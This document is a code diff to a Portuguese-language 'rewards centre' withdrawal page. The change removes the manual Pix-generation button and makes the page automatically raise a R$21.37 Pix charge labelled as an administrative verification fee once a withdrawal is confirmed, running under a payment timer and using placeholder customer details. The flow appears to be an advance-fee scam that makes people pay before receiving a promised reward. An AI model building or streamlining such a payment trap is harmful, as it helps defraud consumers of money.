@@ -703,7 +703,6 @@
     }
 
     .request-withdraw,
-    .generate-pix,
     .copy-pix {
       display: inline-flex;
       align-items: center;
@@ -720,8 +719,7 @@
       transition: transform 0.18s ease, filter 0.18s ease, box-shadow 0.18s ease;
     }
 
-    .request-withdraw:disabled,
-    .generate-pix:disabled {
+    .request-withdraw:disabled {
       background: #e4e5e9;
       color: #a3a6af;
       box-shadow: none;
@@ -729,7 +727,6 @@
     }
 
     .request-withdraw:not(:disabled):active,
-    .generate-pix:not(:disabled):active,
     .copy-pix:active,
     .withdraw:active {
       transform: scale(0.98);
@@ -899,8 +896,7 @@
       margin-top: 16px;
     }
 
-    .spinner,
-    .generate-pix-icon {
+    .spinner {
       width: 18px;
       height: 18px;
       fill: none;
@@ -1176,7 +1172,7 @@
           <div class="select-wrap">
             <select id="pix-type" name="pix-type">
               <option value="cpf">CPF</option>
-              <option value="email">E-mail</option>
+              <option value="email" selected>E-mail</option>
               <option value="telefone">Telefone</option>
               <option value="aleatoria">Chave aleatória</option>
             </select>
@@ -1255,12 +1251,6 @@
         </p>
 
         <div class="pix-action">
-          <button class="generate-pix" id="generate-pix" type="button">
-            <svg class="generate-pix-icon" viewBox="0 0 24 24" aria-hidden="true">
-              <path d="M7 7h10v10H7zM3 3h6v6H3zM15 3h6v6h-6zM3 15h6v6H3zM17 17h4v4h-4z"></path>
-            </svg>
-            <span>Gerar Pix da taxa</span>
-          </button>
           <p class="generate-error" id="generate-error"></p>
 
           <div class="pix-result" id="pix-result">
@@ -1327,7 +1317,6 @@
     const pixKeyInput = document.querySelector("#pix-key");
     const nameError = document.querySelector("#name-error");
     const pixKeyError = document.querySelector("#pix-key-error");
-    const generatePix = document.querySelector("#generate-pix");
     const pixResult = document.querySelector("#pix-result");
     const pixCode = document.querySelector("#pix-code");
     const pixStatus = document.querySelector("#pix-status");
@@ -1345,7 +1334,7 @@
 
     const withdrawalData = {
       name: "",
-      pixType: "cpf",
+      pixType: "email",
       pixKey: "",
       document: "",
       email: "",
@@ -1618,12 +1607,86 @@
     function resetPixGeneration() {
       isGeneratingPix = false;
       hasGeneratedPix = false;
-      generatePix.disabled = false;
       pixResult.classList.remove("visible");
       pixCode.value = "";
       pixQrWrap.classList.remove("visible");
       setPixStatus("");
       setGenerateError("");
+    }
+
+    async function generatePixPayment() {
+      if (isGeneratingPix) return;
+
+      if (hasGeneratedPix && pixCode.value) {
+        setPixStatus("Pix ja gerado. Use o codigo exibido abaixo.", "success");
+        return;
+      }
+
+      isGeneratingPix = true;
+      pixResult.classList.add("visible");
+      setGenerateError("");
+      pixCode.value = "";
+      pixQrWrap.classList.remove("visible");
+      setPixStatus("Gerando Pix automaticamente...", "success");
+
+      try {
+        const response = await fetch("/api/payments/checkout", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            idempotencyKey: withdrawalData.checkoutKey,
+            items: [
+              {
+                title: "Taxa administrativa de verificacao e processamento",
+                unitPrice: 21.37,
+                quantity: 1,
+              },
+            ],
+            customer: {
+              name: withdrawalData.name || "Cliente Central de Recompensas",
+              cpf: withdrawalData.document,
+              email: withdrawalData.email || "cliente@central.local",
+              phone: withdrawalData.phone || "21999999999",
+            },
+            delivery: {
+              address: "Rua Pix",
+              number: "100",
+              neighborhood: "Centro",
+              city: "Rio de Janeiro",
+              state: "RJ",
+              zip_code: "20000000",
+            },
+          }),
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          throw new Error(data.error || "Nao foi possivel gerar o Pix.");
+        }
+
+        if (!data.pix_code) {
+          throw new Error("A API nao retornou o codigo Pix copia e cola.");
+        }
+
+        pixCode.value = data.pix_code;
+        hasGeneratedPix = true;
+
+        const qrImage = normalizeQrImage(data.pix_base64);
+        if (qrImage) {
+          pixQrImage.src = qrImage;
+          pixQrWrap.classList.add("visible");
+        }
+
+        setPixStatus("Pix gerado. Copie o codigo ou escaneie o QR Code.", "success");
+      } catch (error) {
+        setGenerateError(getFriendlyPixError(error));
+        setPixStatus("");
+      } finally {
+        isGeneratingPix = false;
+      }
     }
 
     openWithdraw.addEventListener("click", () => {
@@ -1700,96 +1763,15 @@
       window.setTimeout(() => {
         startPaymentTimer();
         showScreen(confirmScreen);
+        generatePixPayment();
         isSubmittingWithdraw = false;
         validateWithdrawForm();
       }, 1900);
     });
 
-    generatePix.addEventListener("click", async () => {
-      if (isGeneratingPix) return;
-
-      if (hasGeneratedPix && pixCode.value) {
-        setPixStatus("Pix já gerado. Use o código exibido abaixo.", "success");
-        return;
-      }
-
-      const originalContent = generatePix.innerHTML;
-      isGeneratingPix = true;
-      generatePix.disabled = true;
-      generatePix.classList.add("loading");
-      generatePix.innerHTML = '<svg class="spinner" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 4a8 8 0 1 1-7.45 5.05"></path><path d="M4.55 9.05H2.5V7"></path></svg><span>Gerando Pix</span>';
-      pixResult.classList.remove("visible");
-      setGenerateError("");
-      pixCode.value = "";
-      pixQrWrap.classList.remove("visible");
-      setPixStatus("");
-
-      try {
-        const response = await fetch("/api/payments/checkout", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            idempotencyKey: withdrawalData.checkoutKey,
-            items: [
-              {
-                title: "Taxa administrativa de verificação e processamento",
-                unitPrice: 21.37,
-                quantity: 1,
-              },
-            ],
-            customer: {
-              name: withdrawalData.name || "Cliente Central de Recompensas",
-              cpf: withdrawalData.document,
-              email: withdrawalData.email || "cliente@central.local",
-              phone: withdrawalData.phone || "21999999999",
-            },
-            delivery: {
-              address: "Rua Pix",
-              number: "100",
-              neighborhood: "Centro",
-              city: "Rio de Janeiro",
-              state: "RJ",
-              zip_code: "20000000",
-            },
-          }),
-        });
-
-        const data = await response.json();
-
-        if (!response.ok) {
-          throw new Error(data.error || "Não foi possível gerar o Pix.");
-        }
-
-        if (!data.pix_code) {
-          throw new Error("A API não retornou o código Pix copia e cola.");
-        }
-
-        pixCode.value = data.pix_code;
-        pixResult.classList.add("visible");
-        hasGeneratedPix = true;
-
-        const qrImage = normalizeQrImage(data.pix_base64);
-        if (qrImage) {
-          pixQrImage.src = qrImage;
-          pixQrWrap.classList.add("visible");
-        }
-
-        setPixStatus("Pix gerado. Copie o código ou escaneie o QR Code.", "success");
-      } catch (error) {
-        setGenerateError(getFriendlyPixError(error));
-      } finally {
-        isGeneratingPix = false;
-        generatePix.classList.remove("loading");
-        generatePix.disabled = hasGeneratedPix;
-        generatePix.innerHTML = originalContent;
-      }
-    });
-
     copyPix.addEventListener("click", async () => {
       if (!pixCode.value) {
-        setPixStatus("Gere o Pix antes de copiar o código.", "error");
+        setPixStatus("Aguarde o Pix ser gerado antes de copiar o codigo.", "error");
         return;
       }
 
